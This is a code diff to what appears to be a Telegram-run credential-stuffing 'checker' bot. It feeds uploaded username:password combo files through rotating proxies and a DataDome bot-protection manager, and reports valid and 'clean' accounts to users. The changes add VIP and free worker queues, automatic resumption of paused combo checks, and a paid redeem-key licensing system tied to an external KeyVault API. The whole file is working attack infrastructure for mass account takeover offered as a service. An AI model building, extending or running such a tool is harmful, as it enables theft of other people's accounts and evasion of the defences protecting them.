+    _all_sessions    = []          # track every thread session for cleanup
+    _all_sessions_lock = threading.Lock()
 
     # ── Register progress bar entry ────────────────────────────
     bar_key = chat_id or label
@@ -3826,57 +5123,209 @@ def _run_checker_for_file(filepath: str, telegram_config: tuple, chat_id=None, l
 
     def get_session():
         if not hasattr(thread_local, "session"):
-            # Stagger startups without holding a lock
-            time.sleep(0.01)
             dm = DataDomeManager()
             thread_local.session = create_thread_session(cookie_manager, dm)
             thread_local.dm      = dm
-            thread_local.session.proxies.update(geo_rotator.get_proxies())
+            # Only update proxies if we have some (create_thread_session already set them)
+            proxy_dict = geo_rotator.get_proxies()
+            if proxy_dict:
+                thread_local.session.proxies.update(proxy_dict)
+            with _all_sessions_lock:
+                _all_sessions.append(thread_local.session)
         else:
-            thread_local.session.proxies.update(geo_rotator.get_proxies())
+            # Refresh proxy for existing session
+            proxy_dict = geo_rotator.get_proxies()
+            if proxy_dict:
+                thread_local.session.proxies.update(proxy_dict)
+            else:
+                # No proxies available — clear proxy settings (try direct)
+                thread_local.session.proxies.clear()
         return thread_local.session, thread_local.dm
 
-    def process_one(idx_line):
-        i, line = idx_line
+    # ── Helper: process a single account line ──
+    def _do_account(line, account_idx):
+        """Process one account. Returns True if processed, False if skipped."""
         if ":" not in line:
-            return
-        # Check both user stop and global shutdown
+            return False
         if stop_event and stop_event.is_set():
-            return
+            return False
         if shutdown_event.is_set():
-            return
-        # ── Acquire global slot — blocks if VPS is at capacity ──
-        _global_thread_sem.acquire()
-        try:
-            if stop_event and stop_event.is_set(): return
-            if shutdown_event.is_set(): return
-            user, pwd = line.split(":", 1)
-            sess, dm  = get_session()
-            # no delay — maximum speed
-            processaccount(sess, user.strip(), pwd.strip(),
-                           cookie_manager, dm, live_stats,
-                           result_folder, telegram_config=telegram_config)
-        except Exception:
-            pass
-        finally:
-            _global_thread_sem.release()
-            with _bars_lock:
-                if bar_key in _active_bars:
-                    done_count[0] += 1
-                    elapsed = max(time.time() - start_t, 0.001)
-                    speed   = int(done_count[0] / elapsed)
-                    _active_bars[bar_key]["done"]  = done_count[0]
-                    _active_bars[bar_key]["speed"] = speed
+            return False
+        user, pwd = line.split(":", 1)
+        sess, dm  = get_session()
+        processaccount(sess, user.strip(), pwd.strip(),
+                       cookie_manager, dm, live_stats,
+                       result_folder, telegram_config=telegram_config)
+        return True
 
-    with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
-        for fut in as_completed(
-            {ex.submit(process_one, item): item
-             for item in enumerate(accounts, 1)}
-        ):
+    def _update_progress():
+        """Update progress bar and persist progress."""
+        with _bars_lock:
+            if bar_key in _active_bars:
+                done_count[0] += 1
+                elapsed = max(time.time() - start_t, 0.001)
+                speed   = int(done_count[0] / elapsed)
+                _active_bars[bar_key]["done"]  = done_count[0]
+                _active_bars[bar_key]["speed"] = speed
+        # Persist progress every 10 accounts for crash recovery
+        if chat_id and done_count[0] % 10 == 0:
+            _update_session_progress(chat_id, done_count[0])
+
+    # ════════════════════════════════════════════════════════════════
+    #  VIP/FREE QUEUE WORKER SYSTEM
+    #
+    #  VIP users: NO QUEUE — workers acquire semaphore (always available),
+    #    then grab account → instant processing.
+    #  Free users: HAVE QUEUE — workers acquire semaphore FIRST (blocks if
+    #    all free_threads slots taken), then grab account → queued.
+    #
+    #  Semaphore-first design prevents race conditions where a worker
+    #  pulls an account but blocks on semaphore, making account invisible.
+    # ════════════════════════════════════════════════════════════════
+
+    # Create priority queue with the user's thread allocation
+    pq = VipFreeQueue(vip_threads or 1, free_threads or 1)
+
+    # Add all accounts to the appropriate queue based on user tier
+    # ALL accounts from this user go to the SAME queue (VIP or Free)
+    # because the tier is per-USER, not per-account
+    for idx, line in enumerate(accounts, 1):
+        account = {"username": line.split(":")[0].strip() if ":" in line else "",
+                   "password": line.split(":", 1)[1].strip() if ":" in line else "",
+                   "line": line, "idx": idx}
+        if user_tier == "vip" or is_vip or is_owner:
+            pq.add_vip(account)
+        else:
+            pq.add_free(account)
+
+    # ── VIP Worker: Acquires slot FIRST (instant), then processes account ──
+    # KEY: VIP semaphore is acquired BEFORE pulling from queue.
+    # Since # of VIP workers = vip_threads, the semaphore always has slots
+    # available → NO QUEUE for VIP accounts.
+    def vip_worker():
+        while not pq.should_stop():
+            # Step 1: Acquire VIP slot (instant — dedicated VIP pool)
+            if not pq.acquire_vip_slot(timeout=0.5):
+                # Timeout — check if there's still work
+                if pq.vip_remaining == 0:
+                    break
+                if stop_event and stop_event.is_set():
+                    break
+                if shutdown_event.is_set():
+                    break
+                continue
+
+            # Step 2: Get next VIP account
+            account = pq.get_vip()
+            if account is None:
+                # No account in queue — release slot and wait
+                pq.release_vip_slot()
+                if pq.vip_remaining == 0:
+                    break
+                if stop_event and stop_event.is_set():
+                    break
+                if shutdown_event.is_set():
+                    break
+                time.sleep(0.05)
+                continue
+
+            # Step 3: Acquire global VPS slot, then process
+            _global_thread_sem.acquire()
             try:
-                fut.result()
-            except Exception:
-                pass
+                if stop_event and stop_event.is_set():
+                    return
+                if shutdown_event.is_set():
+                    return
+                _do_account(account['line'], account['idx'])
+            except Exception as e:
+                logger.debug(f"[VIP-WORKER] Error: {e}")
+            finally:
+                _global_thread_sem.release()
+                pq.release_vip_slot()
+                pq.mark_vip_done()
+                _update_progress()
+
+    # ── Free Worker: Acquires slot FIRST (BLOCKS if full = QUEUE), then processes ──
+    # KEY: Free semaphore is acquired BEFORE pulling from queue.
+    # If all free_threads slots are taken, the worker WAITS here — this IS the queue.
+    # Once a slot opens up, the worker grabs the next account and processes it.
+    def free_worker():
+        while not pq.should_stop():
+            # Step 1: Acquire Free slot — THIS IS THE QUEUE
+            # If all free_threads slots are busy, worker blocks here until one opens
+            if not pq.acquire_free_slot(timeout=0.5):
+                # Timeout — check if there's still work
+                if pq.free_remaining == 0:
+                    break
+                if stop_event and stop_event.is_set():
+                    break
+                if shutdown_event.is_set():
+                    break
+                continue
+
+            # Step 2: Get next Free account (now that we have a slot)
+            account = pq.get_free()
+            if account is None:
+                # No account in queue — release slot and wait
+                pq.release_free_slot()
+                if pq.free_remaining == 0:
+                    break
+                if stop_event and stop_event.is_set():
+                    break
+                if shutdown_event.is_set():
+                    break
+                time.sleep(0.05)
+                continue
+
+            # Step 3: Acquire global VPS slot, then process
+            _global_thread_sem.acquire()
+            try:
+                if stop_event and stop_event.is_set():
+                    return
+                if shutdown_event.is_set():
+                    return
+                _do_account(account['line'], account['idx'])
+            except Exception as e:
+                logger.debug(f"[FREE-WORKER] Error: {e}")
+            finally:
+                _global_thread_sem.release()
+                pq.release_free_slot()
+                pq.mark_free_done()
+                _update_progress()
+
+    # ── Start workers ──
+    workers = []
+
+    if vip_threads > 0:
+        # VIP workers — always running, drain VIP queue instantly (NO QUEUE)
+        for i in range(vip_threads):
+            t = threading.Thread(target=vip_worker, name=f"VIP-{i+1}", daemon=True)
+            t.start()
+            workers.append(t)
+
+    if free_threads > 0:
+        # Free workers — limited, processes Free queue (HAS QUEUE)
+        for i in range(free_threads):
+            t = threading.Thread(target=free_worker, name=f"FREE-{i+1}", daemon=True)
+            t.start()
+            workers.append(t)
+
+    # ── Wait for all accounts to be fully processed ──
+    while not pq.all_done():
+        if stop_event and stop_event.is_set():
+            pq.stop()
+            break
+        if shutdown_event.is_set():
+            pq.stop()
+            break
+        time.sleep(1)
+
+    # Signal stop to all workers
+    pq.stop()
+
+    # Wait for workers to finish
+    for t in workers:
+        t.join(timeout=3)
 
     # ── Stop the progress updater ──────────────────────────────
     _progress_stop.set()
@@ -3899,14 +5348,15 @@ def _run_checker_for_file(filepath: str, telegram_config: tuple, chat_id=None, l
     except Exception:
         pass
 
-    # ── Close all thread sessions to free connections + memory ──
-    if hasattr(thread_local, "session"):
-        try:
-            thread_local.session.close()
-        except Exception:
-            pass
+    # ── Close ALL thread sessions to free connections + memory ──
+    with _all_sessions_lock:
+        for sess in _all_sessions:
+            try:
+                sess.close()
+            except Exception:
+                pass
+        _all_sessions.clear()
 
-    # Force GC to free memory after checker run
     gc.collect()
 
     # ── Remove bar + print done line so terminal stays clean ──
@@ -3956,15 +5406,13 @@ def _add_coowner(uid: int):
     """Add a co-owner ID and persist to config."""
     COOWNER_IDS.add(uid)
     _cfg["coowner_ids"] = list(COOWNER_IDS)
-    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
-        json.dump(_cfg, f, indent=2)
+    _save_config(_cfg)
 
 def _remove_coowner(uid: int):
     """Remove a co-owner ID and persist to config."""
     COOWNER_IDS.discard(uid)
     _cfg["coowner_ids"] = list(COOWNER_IDS)
-    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
-        json.dump(_cfg, f, indent=2)
+    _save_config(_cfg)
 
 
 def _is_vip_user(chat_id) -> bool:
@@ -3981,44 +5429,677 @@ def _is_vip_user(chat_id) -> bool:
     return False
 
 
+def _has_proxies() -> bool:
+    """Check if proxy pool has available proxies."""
+    return hasattr(geo_rotator, 'total') and geo_rotator.total > 0 and bool(geo_rotator._proxies)
+
+
+# Track if we already sent the "no proxy" warning to owner
+_no_proxy_warned = False
+
+def _notify_no_proxy(token, chat_id=None, from_user=None):
+    """Notify owner that no proxies are available. Only sends once per empty-pool event."""
+    global _no_proxy_warned
+    # Re-check pool right before sending — avoid race condition with upload/fetch
+    if _has_proxies():
+        _clear_no_proxy_warning()
+        return  # pool has proxies now, no need to notify
+    if _no_proxy_warned:
+        return  # already notified
+    _no_proxy_warned = True
+    try:
+        _now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        _pool_size = geo_rotator.total if hasattr(geo_rotator, 'total') else 0
+        _tg_send(token, OWNER_ID,
+            f"\u26a0\ufe0f <b>No Proxies Available!</b>\n\n"
+            f"\ud83d\udd50 <b>Time:</b> {_now}\n"
+            f"\ud83d\udce1 <b>Proxy Pool:</b> {_pool_size} proxies\n"
+            f"\ud83d\udd27 <b>Action:</b> Upload proxy files to the proxy/ folder\n\n"
+            f"<i>Bot is in maintenance mode for non-owner users.</i>"
+        )
+    except Exception:
+        pass
+
+def _clear_no_proxy_warning():
+    """Reset the no-proxy warning flag so owner gets notified again if pool empties later."""
+    global _no_proxy_warned
+    _no_proxy_warned = False
+
+
+# ── Proxy-paused users: auto-resume when proxies become available ──
+_proxy_paused_users: dict = {}   # chat_id -> {combo_path, file_name, lines, user_data}
+_proxy_paused_lock = threading.Lock()
+
+
+def _register_proxy_paused(chat_id, combo_path: str, file_name: str, lines: list, user_data: dict):
+    """Register a user whose check is paused because no proxies are available.
+    Their combo file and progress will be saved so it can auto-resume later.
+    
+    If the user already has an active session with progress (e.g. mid-check
+    when proxies ran out), that progress is carried over so we don't re-check
+    already-processed accounts."""
+    # ── Carry over progress from existing active session if present ──
+    existing_progress = 0
+    existing_persistent_path = ""
+    with _active_sessions_lock:
+        key = str(chat_id)
+        if key in _active_sessions:
+            existing_progress = _active_sessions[key].get("progress", 0)
+            existing_persistent_path = _active_sessions[key].get("persistent_path", "")
+    
+    # Also check if user was already proxy-paused (carry over that progress)
+    with _proxy_paused_lock:
+        if str(chat_id) in _proxy_paused_users:
+            prev = _proxy_paused_users[str(chat_id)]
+            if prev.get("progress", 0) > existing_progress:
+                existing_progress = prev["progress"]
+            if not existing_persistent_path and prev.get("persistent_path"):
+                existing_persistent_path = prev["persistent_path"]
+    
+    os.makedirs(SAVED_COMBOS_DIR, exist_ok=True)
+    persistent_path = os.path.join(SAVED_COMBOS_DIR, f"paused_{chat_id}_{file_name}")
+    
+    # If we have existing progress, trim the lines to only include remaining ones
+    remaining_lines = lines
+    if existing_progress > 0 and existing_progress < len(lines):
+        remaining_lines = lines[existing_progress:]
+        logger.info(f"[BOT] Proxy-paused user {chat_id}: trimming {existing_progress} already-processed lines, {len(remaining_lines)} remaining")
+    
+    try:
+        with open(persistent_path, "w", encoding="utf-8") as fh:
+            fh.write("\n".join(remaining_lines) + "\n")
+    except Exception as e:
+        logger.warning(f"[BOT] Could not save paused combo for {chat_id}: {e}")
+        persistent_path = combo_path
+
+    with _proxy_paused_lock:
+        _proxy_paused_users[str(chat_id)] = {
+            "chat_id": chat_id,
+            "combo_path": combo_path,
+            "persistent_path": persistent_path,
+            "file_name": file_name,
+            "total_lines": len(remaining_lines),
+            "progress": 0,  # Reset to 0 because we already trimmed the file
+            "level": user_data.get("level", [1]),
+            "clean_filter": user_data.get("clean_filter", "both"),
+            "hits_id": user_data.get("hits_id", chat_id),
+            "username": user_data.get("username", ""),
+            "combo_limit": user_data.get("combo_limit", COMBO_LINE_LIMIT),
+            "paused_at": time.time(),
+        }
+    logger.info(f"[BOT] Registered proxy-paused user: chat_id={chat_id}, file={file_name}, lines={len(remaining_lines)}")
+
+
+def _unregister_proxy_paused(chat_id):
+    """Remove a user from the proxy-paused list (e.g. if they /stop or re-upload)."""
+    with _proxy_paused_lock:
+        sess = _proxy_paused_users.pop(str(chat_id), None)
+    # Clean up persistent combo file
+    if sess:
+        ppath = sess.get("persistent_path", "")
+        if ppath and os.path.exists(ppath):
+            try:
+                os.remove(ppath)
+            except Exception:
+                pass
+
+
+def _resume_proxy_paused_users(token: str):
+    """Called when proxies become available after being empty.
+    Auto-resumes all users who were paused due to no proxy.
+    
+    Key fix: The persistent combo file is trimmed by _update_session_progress,
+    so we read ALL lines from it (they're already the remaining lines).
+    """
+    with _proxy_paused_lock:
+        paused = dict(_proxy_paused_users)  # copy
+        _proxy_paused_users.clear()
+
+    if not paused:
+        return
+
+    logger.info(f"[BOT] ✅ Proxies available! Resuming {len(paused)} paused user(s)...")
+
+    for key, sess in paused.items():
+        chat_id    = sess.get("chat_id")
+        file_name  = sess.get("file_name", "unknown.txt")
+        persistent_path = sess.get("persistent_path", "")
+
+        # Find the combo file
+        combo_path = None
+        for candidate in [persistent_path, sess.get("combo_path", ""),
+                          os.path.join(SAVED_COMBOS_DIR, f"paused_{chat_id}_{file_name}")]:
+            if candidate and os.path.exists(candidate):
+                combo_path = candidate
+                break
+
+        if not combo_path:
+            _tg_send(token, chat_id,
+                "⚠️ <b>Proxies are back!</b>\n\n"
+                "But your combo file was lost. Please re-upload it.")
+            continue
+
+        # Read lines from the combo file — the file already contains only remaining lines
+        all_lines = []
+        for enc in ["utf-8", "latin-1", "cp1252", "iso-8859-1"]:
+            try:
+                with open(combo_path, "r", encoding=enc, errors="ignore") as fh:
+                    all_lines = [l.strip() for l in fh if l.strip() and ":" in l]
+                break
+            except Exception:
+                continue
+
+        if not all_lines:
+            _tg_send(token, chat_id,
+                "⚠️ <b>Proxies are back!</b>\n\n"
+                "But your combo file is empty. Please re-upload it.")
+            continue
+
+        # The persistent file is already trimmed, so remaining_lines = all_lines
+        remaining_lines = all_lines
+        progress = sess.get("progress", 0)
+        total = sess.get("total_lines", len(remaining_lines))
+
+        if not remaining_lines:
+            _tg_send(token, chat_id,
+                "✅ <b>Proxies are back!</b>\n\n"
+                f"Your check (<code>{file_name}</code>) was already complete.\n"
+                "📂 Send a new combo file to start again.")
+            # Clean up persistent file
+            try:
+                if os.path.exists(combo_path):
+                    os.remove(combo_path)
+            except Exception:
+                pass
+            continue
+
+        # Restore user data
+        d = _udata(chat_id)
+        d["hits_id"]      = sess.get("hits_id", chat_id)
+        d["username"]     = sess.get("username", "")
+        d["level"]        = sess.get("level", [1])
+        d["clean_filter"] = sess.get("clean_filter", "both")
+        d["combo_limit"]  = sess.get("combo_limit", COMBO_LINE_LIMIT)
+
+        # Write remaining lines to a temp file for the checker
+        save_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "combo")
+        os.makedirs(save_dir, exist_ok=True)
+        resume_path = os.path.join(save_dir, f"resume_{chat_id}_{file_name}")
+        with open(resume_path, "w", encoding="utf-8") as fh:
+            fh.write("\n".join(remaining_lines) + "\n")
+
+        # Notify user
+        _tg_send(token, chat_id,
+            f"✅ <b>Proxies are back — Auto-Resuming!</b>\n\n"
+            f"📄 <b>File:</b> <code>{file_name}</code>\n"
+            f"📊 <b>Already done:</b> {progress} | <b>Remaining:</b> {len(remaining_lines)} accounts\n\n"
+            f"<i>Resuming now... Send /stop to cancel.</i>")
+
+        # Start checker thread
+        hits_id = d["hits_id"]
+        user_telegram_config = (token, str(hits_id), d["level"], "", d["clean_filter"])
+
+        with _state_lock:
+            _bot_state[chat_id] = "RUNNING"
+
+        # Save session for crash recovery
+        _save_active_session(chat_id, resume_path, file_name, remaining_lines, d, 0)
+
+        stop_evt = threading.Event()
+        with _stop_events_lock:
+            _stop_events[chat_id] = stop_evt
+
+        def _paused_resume_run(cid=chat_id, rpath=resume_path, tg_cfg=user_telegram_config,
+                        se=stop_evt, fn=file_name, rem=len(remaining_lines), cp=combo_path):
+            try:
+                label = f"proxy-resume:{cid}"
+                stats, result_folder = _run_checker_for_file(
+                    rpath, tg_cfg, chat_id=cid, label=label, stop_event=se
+                )
+                stopped = se.is_set()
+            except Exception as e:
+                stats = {}
+                result_folder = ""
+                stopped = False
+                logger.error(f"[BOT] Proxy-resume checker error: {e}", exc_info=True)
+            finally:
+                with _state_lock:
+                    _bot_state[cid] = "AWAIT_FILE"
+                with _stop_events_lock:
+                    _stop_events.pop(cid, None)
+                _remove_active_session(cid)
+
+                if stopped:
+                    _tg_send(token, cid,
+                        f"🛑 <b>Resumed checker stopped.</b>\n"
+                        f"📊 Partial results for <code>{fn}</code>")
+                else:
+                    valid = stats.get("valid", 0)
+                    invalid = stats.get("invalid", 0)
+                    clean_c = stats.get("clean", 0)
+                    _tg_send(token, cid,
+                        f"✅ <b>Resumed Check Complete!</b>\n\n"
+                        f"📄 <code>{fn}</code>\n"
+                        f"✅ Valid: <code>{valid}</code>  ❌ Invalid: <code>{invalid}</code>  "
+                        f"🧹 Clean: <code>{clean_c}</code>")
+
+                if result_folder and os.path.isdir(result_folder):
+                    _send_results_zip(token, cid, result_folder, fn)
+
+                # Cleanup temp file
+                try:
+                    if os.path.exists(rpath):
+                        os.remove(rpath)
+                except Exception:
+                    pass
+
+                gc.collect()
+                _tg_send(token, cid,
+                    f"📂 Send your next combo file to check again.\n"
+                    f"Or /start to reset your settings.")
+
+        threading.Thread(target=_paused_resume_run, daemon=True).start()
+        logger.info(f"[BOT] ✅ Proxy-resumed session for chat_id={chat_id}, {len(remaining_lines)} remaining")
+
+
 # ══════════════════════════════════════════════════════════════
-#  REDEEM KEY SYSTEM
+#  REDEEM KEY SYSTEM  (with KeyVault API integration)
 # ══════════════════════════════════════════════════════════════
 KEYS_FILE = "redeem_keys.json"
 
-def _load_keys() -> dict:
+def _load_keys(sync_api: bool = True) -> dict:
+    """Load redeem keys — local file first, optionally merge from KeyVault API."""
+    keys = {}
     if os.path.exists(KEYS_FILE):
         try:
             with open(KEYS_FILE, "r", encoding="utf-8") as f:
-                return json.load(f)
+                keys = json.load(f)
         except Exception:
             pass
-    return {}
+    # Merge from API (persists across Railway redeploys)
+    if sync_api:
+        try:
+            api = _get_keysystem_api()
+            if api.enabled:
+                remote = api.load_state("redeem_keys")
+                if remote and isinstance(remote, dict):
+                    for k, v in remote.items():
+                        if k not in keys:
+                            keys[k] = v
+                    if remote:
+                        logger.info(f"[BOT] Synced {len(remote)} redeem keys from KeyVault API")
+        except Exception:
+            pass
+    return keys
 
 def _save_keys(keys: dict):
+    """Save redeem keys to disk AND sync to KeyVault API."""
     with open(KEYS_FILE, "w", encoding="utf-8") as f:
         json.dump(keys, f, indent=2)
+    # Sync to KeyVault API for persistence across Railway redeploys
+    try:
+        if _keysystem_api and _keysystem_api.enabled:
+            _keysystem_api.save_state("redeem_keys", keys)
+    except Exception:
+        pass
+
+
+# ── KeyVault API Integration ────────────────────────────────────
+class KeySystemAPI:
+    """
+    Client for the KeyVault (Key-system) Next.js API.
+    Falls back to local redeem_keys.json when the API is not configured or unreachable.
+    """
+
+    def __init__(self):
+        cfg = _load_config()
+        self.base_url = (cfg.get("keysystem_url") or "").rstrip("/")
+        self.admin_secret = cfg.get("keysystem_admin_secret") or ""
+        self.enabled = bool(self.base_url)
+
+    def _headers(self) -> dict:
+        h = {"Content-Type": "application/json"}
+        if self.admin_secret:
+            h["x-admin-secret"] = self.admin_secret
+        return h
+
+    def reload_config(self):
+        cfg = _load_config()
+        self.base_url = (cfg.get("keysystem_url") or "").rstrip("/")
+        self.admin_secret = cfg.get("keysystem_admin_secret") or ""
+        self.enabled = bool(self.base_url)
+
+    def generate_key(self, duration_seconds: int, max_users: int, combo_limit: int,
+                     count: int = 1, tier: str = "vip", key_format: str = "alphanum",
+                     label: str = "") -> list:
+        """
+        Generate key(s) via the KeyVault API.
+        Parameters match the KeyVault dashboard fields exactly:
+          - tier: "free" | "vip"
+          - key_format: "uuid" | "hex" | "alphanum" | "prefix"
+          - duration_seconds -> expiryDays
+          - combo_limit -> rateLimit
+          - max_users -> maxRedemptions
+          - label: optional key label
+        """
+        if not self.enabled:
+            return []
+
+        expiry_days = max(1, duration_seconds // 86400) if duration_seconds >= 86400 else 0
+
+        generated = []
+        for _ in range(count):
+            try:
+                payload = {
+                    "label": label or f"tg-bot-{tier}",
+                    "tier": tier,
+                    "format": key_format,
+                    "expiryDays": expiry_days,
+                    "rateLimit": str(combo_limit) if combo_limit > 0 else "unlimited",
+                    "threads": VIP_THREADS_PER_USER if tier == "vip" else 2,
+                    "maxRedemptions": max_users if max_users > 0 else None,
+                }
+                resp = requests.post(
+                    f"{self.base_url}/api/keys/generate",
+                    headers=self._headers(),
+                    json=payload,
+                    timeout=15,
+                )
+                if resp.status_code == 201:
+                    data = resp.json()
+                    generated.append(data)
+                else:
+                    logger.warning(f"[KEYSYSTEM] Generate failed: {resp.status_code} {resp.text[:200]}")
+            except Exception as e:
+                logger.warning(f"[KEYSYSTEM] Generate error: {e}")
+        return generated
+
+    def validate_key(self, key_value: str) -> dict:
+        """
+        Validate a key via the KeyVault API.
+        Returns the API response dict, or empty dict on failure/unreachable.
+        Response: {"valid": true/false, "reason": "...", "key": {...}}
+        """
+        if not self.enabled:
+            return {}
+        try:
+            resp = requests.post(
+                f"{self.base_url}/api/keys/validate",
+                headers=self._headers(),
+                json={"key": key_value},
+                timeout=15,
+            )
+            return resp.json()
+        except Exception as e:
+            logger.warning(f"[KEYSYSTEM] Validate error: {e}")
+            return {}
+
+    def list_keys(self) -> list:
+        """
+        List all keys from the KeyVault API.
+        Returns a list of key dicts, or empty list on failure.
+        """
+        if not self.enabled:
+            return []
+        try:
+            resp = requests.get(
+                f"{self.base_url}/api/keys/list",
+                headers=self._headers(),
+                timeout=15,
+            )
+            if resp.status_code == 200:
+                return resp.json()
+        except Exception as e:
+            logger.warning(f"[KEYSYSTEM] List error: {e}")
+        return []
+
+    def delete_key(self, key_id: str) -> bool:
+        """
+        Delete a key by its ID via the KeyVault API.
+        Returns True on success.
+        """
+        if not self.enabled:
+            return False
+        try:
+            resp = requests.delete(
+                f"{self.base_url}/api/keys/delete",
+                headers=self._headers(),
+                json={"id": key_id},
+                timeout=15,
+            )
+            return resp.status_code == 200
+        except Exception as e:
+            logger.warning(f"[KEYSYSTEM] Delete error: {e}")
+            return False
+
+    def revoke_key(self, key_id: str) -> bool:
+        """
+        Revoke a key by its ID via the KeyVault API.
+        Returns True on success.
+        """
+        if not self.enabled:
+            return False
+        try:
+            resp = requests.post(
+                f"{self.base_url}/api/keys/revoke",
+                headers=self._headers(),
+                json={"id": key_id},
+                timeout=15,
+            )
+            return resp.status_code == 200
+        except Exception as e:
+            logger.warning(f"[KEYSYSTEM] Revoke error: {e}")
+            return False
+
+    # ── Bot state persistence (via /api/bot/state) ─────────────
+    def save_state(self, key: str, data) -> bool:
+        """Save arbitrary JSON data to KeyVault KV for persistence across redeploys."""
+        if not self.enabled:
+            return False
+        try:
+            resp = requests.post(
+                f"{self.base_url}/api/bot/state",
+                headers=self._headers(),
+                json={"key": key, "data": data},
+                timeout=15,
+            )
+            return resp.status_code == 200
+        except Exception as e:
+            logger.warning(f"[KEYSYSTEM] Save state error: {e}")
+            return False
+
+    def load_state(self, key: str):
+        """Load previously saved data from KeyVault KV."""
+        if not self.enabled:
+            return None
+        try:
+            resp = requests.get(
+                f"{self.base_url}/api/bot/state",
+                headers=self._headers(),
+                params={"key": key},
+                timeout=15,
+            )
+            if resp.status_code == 200:
+                return resp.json().get("data")
+            return None
+        except Exception as e:
+            logger.warning(f"[KEYSYSTEM] Load state error: {e}")
+            return None
+
+    def delete_state(self, key: str) -> bool:
+        """Delete saved state from KeyVault KV."""
+        if not self.enabled:
+            return False
+        try:
+            resp = requests.delete(
+                f"{self.base_url}/api/bot/state",
+                headers=self._headers(),
+                params={"key": key},
+                timeout=15,
+            )
+            return resp.status_code == 200
+        except Exception as e:
+            logger.warning(f"[KEYSYSTEM] Delete state error: {e}")
+            return False
+
+
+_keysystem_api: KeySystemAPI = None
+
+def _get_keysystem_api() -> KeySystemAPI:
+    """Lazy-init and return the global KeySystemAPI instance."""
+    global _keysystem_api
+    if _keysystem_api is None:
+        _keysystem_api = KeySystemAPI()
+    return _keysystem_api
+
+
+def _handle_keysystem_config(token: str, chat_id, from_user: dict, args: str):
+    """
+    /keysystem              — show current config
+    /keysystem url <URL>    — set KeyVault API URL
+    /keysystem secret <S>   — set admin secret
+    /keysystem status       — test connectivity
+    """
+    api = _get_keysystem_api()
+    parts = args.strip().split(None, 1) if args.strip() else []
+
+    if not parts:
+        status = "✅ Connected" if api.enabled else "❌ Not configured"
+        url_display = api.base_url or "<i>not set</i>"
+        secret_display = "***" if api.admin_secret else "<i>not set</i>"
+        _tg_send(token, chat_id,
+            f"🔑 <b>KeyVault API Config</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"📡 <b>Status:</b> {status}\n"
+            f"🌐 <b>URL:</b> {url_display}\n"
+            f"🔐 <b>Secret:</b> {secret_display}\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"<b>Usage:</b>\n"
+            f"  <code>/keysystem url https://your-app.vercel.app</code>\n"
+            f"  <code>/keysystem secret YOUR_ADMIN_SECRET</code>\n"
+            f"  <code>/keysystem status</code> — test connection")
+        return
+
+    subcmd = parts[0].lower()
+    value = parts[1] if len(parts) > 1 else ""
+
+    if subcmd == "url":
+        if not value:
+            _tg_send(token, chat_id, "❌ Provide a URL: <code>/keysystem url https://...</code>")
+            return
+        cfg = _load_config()
+        cfg["keysystem_url"] = value.rstrip("/")
+        _save_config(cfg)
+        api.reload_config()
+        _tg_send(token, chat_id,
+            f"✅ <b>KeyVault URL set!</b>\n\n"
+            f"🌐 <code>{value}</code>\n\n"
+            f"<i>Use /keysystem status to test the connection.</i>")
+        return
+
+    if subcmd == "secret":
+        if not value:
+            _tg_send(token, chat_id, "❌ Provide the secret: <code>/keysystem secret YOUR_SECRET</code>")
+            return
+        cfg = _load_config()
+        cfg["keysystem_admin_secret"] = value
+        _save_config(cfg)
+        api.reload_config()
+        _tg_send(token, chat_id,
+            f"✅ <b>Admin secret updated!</b>\n\n"
+            f"<i>Use /keysystem status to test the connection.</i>")
+        return
+
+    if subcmd == "status":
+        if not api.enabled:
+            _tg_send(token, chat_id,
+                "❌ <b>KeyVault not configured.</b>\n\n"
+                "Set the URL first: <code>/keysystem url https://your-app.vercel.app</code>")
+            return
+        try:
+            resp = requests.get(
+                f"{api.base_url}/api/keys/list",
+                headers=api._headers(),
+                timeout=10,
+            )
+            if resp.status_code == 200:
+                key_count = len(resp.json())
+                _tg_send(token, chat_id,
+                    f"✅ <b>KeyVault Connected!</b>\n\n"
+                    f"📡 {api.base_url}\n"
+                    f"🔑 {key_count} key(s) in remote store\n\n"
+                    f"<i>Keys generated with /generate_key will now sync to KeyVault.</i>")
+            elif resp.status_code == 401:
+                _tg_send(token, chat_id,
+                    "🔒 <b>Authentication failed.</b>\n\n"
+                    "Check your admin secret: <code>/keysystem secret YOUR_SECRET</code>")
+            else:
+                _tg_send(token, chat_id,
+                    f"⚠️ <b>Unexpected response:</b> HTTP {resp.status_code}\n\n"
+                    f"<code>{resp.text[:200]}</code>")
+        except Exception as e:
+            _tg_send(token, chat_id,
+                f"❌ <b>Connection failed:</b>\n\n"
+                f"<code>{str(e)[:200]}</code>\n\n"
+                f"Check the URL: <code>/keysystem url ...</code>")
+        return
+
+    _tg_send(token, chat_id,
+        "❌ Unknown sub-command.\n\n"
+        "<b>Usage:</b>\n"
+        "  <code>/keysystem</code> — show config\n"
+        "  <code>/keysystem url https://...</code> — set URL\n"
+        "  <code>/keysystem secret ...</code> — set secret\n"
+        "  <code>/keysystem status</code> — test connection")
+
 
 def _gen_key() -> str:
     return uuid.uuid4().hex[:20].upper()
 
+
+def _gen_local_key(key_format: str, tier: str = "free") -> str:
+    """Generate a key value matching KeyVault format options."""
+    import random
+    if key_format == "uuid":
+        return str(uuid.uuid4())
+    elif key_format == "hex":
+        return "".join(random.choices("0123456789abcdef", k=32))
+    elif key_format == "alphanum":
+        chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789"
+        return "".join(random.choices(chars, k=24))
+    elif key_format == "prefix":
+        chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789"
+        pfx = "vip" if tier == "vip" else "free"
+        part1 = "".join(random.choices(chars, k=8))
+        part2 = "".join(random.choices(chars, k=8))
+        return f"{pfx}_{part1}_{part2}"
+    else:
+        return uuid.uuid4().hex[:20].upper()
+
 # ── /generate_key interactive state ────────────────────────────
 # Stores partial genkey wizard data per owner chat_id
-_genkey_wizard: dict = {}  # chat_id -> {"step": "AWAIT_DURATION"|"AWAIT_USERS"|"AWAIT_LIMIT"|"AWAIT_COUNT", "duration": int, "max_users": int, "combo_limit": int}
